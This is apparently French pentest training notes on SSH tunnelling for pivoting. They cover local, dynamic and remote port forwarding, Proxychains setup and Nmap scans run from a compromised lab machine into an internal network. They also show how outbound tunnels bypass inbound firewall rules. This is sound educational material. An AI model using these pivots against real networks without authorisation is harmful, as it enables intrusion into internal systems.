# Tunnel SSH

## Local Port Forwarding

Écoute sur un port du client SSH, forward les paquets via le tunnel vers une destination choisie côté serveur SSH.

```
ssh -f -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@ssh_server
```

`LOCAL_IP` est optionnel, par défaut `127.0.0.1` (accessible uniquement en local). Mettre `0.0.0.0` pour exposer le port sur toutes les interfaces.


| Flag | Description |
|------|-------------|
| `-f` | Passe SSH en arrière-plan juste avant l'exécution (libère le terminal) |
| `-N` | Ne pas ouvrir de shell distant — juste maintenir le tunnel |
| `-L` | Définit la règle de port forwarding local `[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT` |
| `-v` | Mode verbose pour débugger la connexion |
**Vérifier que le port écoute sur la machine pivot**

```bash
ss -ntplu
```

### Accéder à un service localhost de la machine distante

Accéder depuis sa propre machine à un service qui écoute uniquement sur `localhost` côté serveur distant (ex: PostgreSQL sur 5432) :

```bash
ssh -f -N -L 1234:localhost:5432 user@Y.Y.Y.Y
```

Se connecter ensuite avec `psql -h localhost -p 1234`.

### Accéder à une machine d'un réseau interne via un pivot

Depuis une machine pivot qui a accès à un réseau interne inaccessible directement, forwarder un port local vers un service sur une autre machine du réseau interne. Exemple : écouter sur le port 4455 de CONFLUENCE01 et forwarder vers le port SMB 445 d'une machine interne :

```bash
ssh -f -N -L 0.0.0.0:4455:<IP_MACHINE_DISTANTE>:445 user@<IP_PIVOT>
```


**Utiliser le tunnel depuis Kali**

```bash
# SMB
smbclient -p 4455 -L //<IP_PIVOT>/ -U <user> --password=<password>
smbclient -p 4455 //<IP_PIVOT>/<share> -U <user> --password=<password>

# SSH
ssh <user>@<IP_PIVOT> -p 4455

# PostgreSQL
psql -h <IP_PIVOT> -p 4455 -U <user>
```

## Local Dynamic Port Forwarding

Un seul port local (proxy SOCKS) peut forwarder vers **n'importe quel socket** accessible par le serveur SSH, sans avoir à définir une destination à l'avance.

```bash
ssh -f -N -D [LOCAL_IP:]LOCAL_PORT user@Y.Y.Y.Y
```

> Le port local devient un serveur SOCKS. Les paquets doivent être encapsulés au format SOCKS, c'est Proxychains qui s'en charge côté client.

### Ouvrir le tunnel depuis la machine pivot

```bash
# Exposer le proxy SOCKS sur toutes les interfaces, port 9999
ssh -N -D 0.0.0.0:9999 database_admin@Y.Y.Y.Y
```

### Configurer Proxychains

Éditer `/etc/proxychains4.conf` et remplacer la dernière ligne de `[ProxyList]` :

```
socks5 <IP_PIVOT> 9999
```

> `socks5` supporte IPv6, UDP et l'authentification. Utiliser `socks4` si le serveur ne supporte pas SOCKS5.

### Utiliser le tunnel depuis Kali

Préfixer n'importe quelle commande avec `proxychains`, elle sera routée via le proxy SOCKS :

```bash
# SMB
proxychains smbclient -L //<IP_CIBLE>/ -U <user> --password=<password>

# Scan Nmap (TCP connect uniquement, -sT obligatoire)
sudo proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
```

> Nmap : utiliser `-sT` (TCP connect), jamais `-sS` (raw packets incompatibles SOCKS). Passer `-n -Pn` pour éviter les résolutions DNS/ping qui ne passent pas via SOCKS.
>
> Le scan est lent par défaut — réduire `tcp_read_time_out` et `tcp_connect_time_out` dans `/etc/proxychains4.conf` pour accélérer.

## Remote Port Forwarding

Le port d'écoute est ouvert côté **serveur SSH** (Kali), pas côté client. Le client (machine compromise) initie la connexion sortante — contourne ainsi les firewalls qui bloquent l'inbound mais autorisent l'outbound SSH.

> Analogue à un reverse shell, mais pour le port forwarding.

```bash
ssh -N -R [REMOTE_IP:]REMOTE_PORT:DEST_IP:DEST_PORT user@kali
```

### Prérequis côté Kali

```bash
# Démarrer le serveur SSH
sudo systemctl start ssh

# Vérifier que le port 22 écoute
sudo ss -ntplu
```

> Si l'authentification par mot de passe est refusée, activer `PasswordAuthentication yes` dans `/etc/ssh/sshd_config`.

### Ouvrir le tunnel depuis la machine compromise

```bash
# Écouter sur 127.0.0.1:2345 côté Kali, forwarder vers PostgreSQL sur le réseau interne
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@<IP_KALI>
```

Le port 2345 s'ouvre sur le **loopback de Kali** — le trafic envoyé là est routé par CONFLUENCE01 vers PGDATABASE01.

**Vérifier côté Kali que le port est bien ouvert**

```bash
ss -ntplu | grep 2345
```

### Utiliser le tunnel depuis Kali

```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

## Remote Dynamic Port Forwarding

Combine les avantages du remote forwarding (connexion sortante depuis la machine compromise) et du dynamic forwarding (proxy SOCKS multi-cibles). Le port SOCKS s'ouvre sur **Kali**, le trafic est forwardé par la machine compromise.

> Disponible depuis OpenSSH 7.6 (octobre 2017) — uniquement le client doit être ≥ 7.6, pas le serveur.

```bash
ssh -N -R REMOTE_PORT user@kali
```

> Seul le port est spécifié (pas de destination) — le proxy SOCKS s'ouvre sur le loopback de Kali.

### Ouvrir le tunnel depuis la machine compromise

```bash
# Lier le proxy SOCKS sur 127.0.0.1:9998 côté Kali
ssh -N -R 9998 kali@<IP_KALI>
```

**Vérifier côté Kali**

```bash
sudo ss -ntplu | grep 9998
```

### Configurer Proxychains et utiliser le tunnel

Mettre à jour `/etc/proxychains4.conf` :

```
socks5 127.0.0.1 9998
```

```bash
# Scan Nmap via le proxy SOCKS
proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
```
